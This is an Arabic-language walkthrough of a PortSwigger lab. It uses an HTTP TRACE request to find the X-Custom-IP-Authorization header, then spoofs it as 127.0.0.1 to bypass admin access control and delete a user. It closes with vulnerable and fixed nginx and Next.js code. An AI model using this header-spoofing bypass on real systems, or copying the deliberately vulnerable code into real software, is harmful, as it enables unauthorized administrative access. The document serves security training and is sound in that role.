# Lab: Authentication bypass via information disclosure

> **Category:** Information Disclosure  
> **Difficulty:** APPRENTICE  
> **Lab Link:** [PortSwigger Lab - Authentication bypass via information disclosure](https://portswigger.net/web-security/information-disclosure/lab-authentication-bypass-via-information-disclosure)

---

## 🎯 الهدف الرئيسي

استغلال معلومات مسربة من الخادم (عبر طريقة `TRACE`) لاكتشاف هيدر مخصص يستخدمه النظام الأمامي (front-end) لتحديد عنوان IP الخاص بالطلب. ثم استخدام هذا الهيدر لتزوير عنوان IP المحلي (`127.0.0.1`) وتجاوز المصادقة للوصول إلى لوحة التحكم `/admin` وحذف `carlos`.

**الحساب:** `wiener:peter`

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: محاولة الوصول إلى /admin

- في Burp Repeater، أرسل طلب `GET /admin`:

```http
GET /admin HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**النتيجة:** الرد يكشف:

```
The admin panel is only accessible if logged in as an administrator,
or if requested from a local IP (127.0.0.1)
```

### الخطوة 2: استخدام طريقة TRACE

طريقة `TRACE` تستخدم لأغراض التصحيح (debugging)، وقد تعكس الطلب مع أي هيدرات إضافية يضيفها النظام الأمامي.

- غيّر الطلب من `GET` إلى `TRACE`:

```http
TRACE /admin HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

### الخطوة 3: تحليل الرد

سترى رداً مثل هذا:

```http
HTTP/1.1 200 OK
Content-Type: message/http

TRACE /admin HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Custom-IP-Authorization: YOUR_IP_ADDRESS
```

**الاستنتاج:** النظام الأمامي يضيف هيدر `X-Custom-IP-Authorization` بقيمة عنوان IP الخاص بالمستخدم.

### الخطوة 4: اختبار الهيدر

- الآن أرسل طلب `GET /admin` مع إضافة الهيدر يدوياً:

```http
GET /admin HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
```

**النتيجة:** تظهر لوحة التحكم ✅

### الخطوة 5: إعداد قاعدة Match and Replace في Burp

لتطبيق الهيدر تلقائياً على جميع الطلبات:

- في Burp → **Proxy** → **Match and Replace**
- اضغط **Add**
- **Type:** Request header
- **Match:** (اتركه فارغاً)
- **Replace:** `X-Custom-IP-Authorization: 127.0.0.1`
- اضغط **Test** → ستظهر نافذة توضح إضافة الهيدر
- اضغط **OK**

### الخطوة 6: الوصول إلى /admin وحذف carlos

- الآن في المتصفح، اذهب إلى `/admin`
- ستظهر لوحة التحكم
- اضغط على زر **Delete** بجانب `carlos`

### الخطوة 7: حل المختبر

بعد حذف `carlos`، سيتم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هي طريقة TRACE؟** | طريقة HTTP تستخدم لأغراض التصحيح، تعكس الطلب المستلم مع أي هيدرات مضافة |
| **ما هو الهيدر المكتشف؟** | `X-Custom-IP-Authorization` |
| **كيف يتم استخدامه؟** | لتحديد عنوان IP للطلب (يستخدمه النظام الأمامي للتحقق من المصدر) |
| **كيف نستغله؟** | نضيف الهيدر بقيمة `127.0.0.1` لتجاوز حماية IP المحلي |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

1. النظام الأمامي (front-end) يضيف هيدر `X-Custom-IP-Authorization` يمكن تزويره من قبل العميل
2. طريقة `TRACE` مكنة وتكشف هيدرات داخلية
3. نظام التحكم بالوصول يعتمد على هذا الهيدر القابل للتزوير

---

### ❌ Non-Compliant Code (Configuration)

```nginx
# إعدادات Nginx - إضافة هيدر X-Custom-IP-Authorization
location / {
    proxy_set_header X-Custom-IP-Authorization $remote_addr;
    proxy_pass http://backend;
}
```

```javascript
// Backend (Next.js) - التحقق من الصلاحية
export default function adminHandler(req, res) {
  const { sessionId } = req.cookies;
  const user = getUserBySession(sessionId);
  
  // خطأ: التحقق من الهيدر القابل للتزوير
  const ip = req.headers['x-custom-ip-authorization'];
  
  if (user?.role === 'admin' || ip === '127.0.0.1') {
    return res.send(adminPanel);
  }
  
  res.status(403).send('Access denied');
}
```

```nginx
# إعدادات Nginx - طريقة TRACE مكنة
# خطأ: السماح بطريقة TRACE في الإنتاج
```

---

### ✅ Compliant Code (Configuration)

```nginx
# إعدادات Nginx - إصلاح
# 1. تعطيل طريقة TRACE في الإنتاج
if ($request_method = TRACE) {
    return 405;
}

# 2. لا تعتمد على هيدرات من العميل للتحقق من IP
# بدلاً من ذلك، استخدم $remote_addr مباشرة ولا ترسله كـ header

location /admin {
    # التحقق الفعلي من IP على مستوى الخادم
    allow 127.0.0.1;
    deny all;
    
    # إزالة أي هيدر X-Custom-IP-Authorization وارد من العميل
    proxy_set_header X-Custom-IP-Authorization "";
    
    proxy_pass http://backend;
}
```

```javascript
// Backend (Next.js) - إصلاح
export default function adminHandler(req, res) {
  const { sessionId } = req.cookies;
  const user = getUserBySession(sessionId);
  
  // إصلاح 1: استخدام المصادقة الفعلية فقط
  if (user?.role === 'admin') {
    return res.send(adminPanel);
  }
  
  // إصلاح 2: إزالة الاعتماد على هيدرات العميل
  // استخدم socket IP المباشر إذا لزم الأمر
  const realIp = req.socket.remoteAddress;
  
  // إصلاح 3: تسجيل المحاولات المشبوهة
  if (req.headers['x-custom-ip-authorization']) {
    console.warn(`Suspicious header from ${realIp}`);
  }
  
  res.status(403).send('Access denied');
}
```

**الخلاصة:** 
1. لا تعتمد على هيدرات يمكن تزويرها من العميل للتحقق من الصلاحية
2. استخدم المصادقة الفعلية (session + roles)
3. عطل طريقة `TRACE` في بيئة الإنتاج

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **تعطيل TRACE:** أضف `return 405` لطريقة TRACE في الإنتاج.
2. **لا تعتمد على هيدرات العميل:** استخدم `$remote_addr` مباشرة ولا ترسله كـ header.
3. **إزالة الهيدرات الداخلية:** لا تكشف هيدرات داخلية يمكن تزويرها.
4. **استخدام المصادقة الفعلية:** لا تعتمد على IP فقط للتحكم بالوصول.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/information-disclosure/lab-authentication-bypass-via-information-disclosure)
- [HTTP TRACE Method](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/TRACE)
- [Information Disclosure Cheat Sheet](https://portswigger.net/web-security/information-disclosure)
